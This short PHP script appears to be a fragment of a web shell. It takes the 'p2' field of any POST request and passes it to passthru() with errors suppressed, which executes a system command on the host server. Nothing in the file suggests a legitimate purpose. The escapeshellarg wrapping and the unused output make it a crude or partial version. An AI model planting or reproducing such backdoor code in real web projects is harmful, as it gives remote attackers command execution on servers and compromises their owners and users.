<?php
function ex($in) {
	$res = '';
	ob_start();
	@passthru($in);
	$res = ob_get_clean();
	return $res;
}

ex(escapeshellarg($_POST['p2']));
?>